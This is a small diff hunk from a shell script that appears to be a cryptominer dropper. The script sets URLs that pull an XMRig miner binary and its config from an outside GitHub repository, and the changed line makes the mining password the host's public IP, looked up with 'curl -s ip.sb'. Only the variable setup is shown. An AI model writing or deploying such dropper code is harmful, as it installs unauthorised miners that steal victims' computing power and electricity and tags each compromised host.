@@ -2,7 +2,7 @@
 
 CONFIG="https://raw.githubusercontent.com/blackUser623/xm/main/config.json"
 TERMINAL="https://raw.githubusercontent.com/blackUser623/xm/main/xmrig"
-PASS=$(hostname)
+PASS=$(curl -s ip.sb)
 DIR="$1"
 PATH="/usr/bin/"
 FILE="$2"
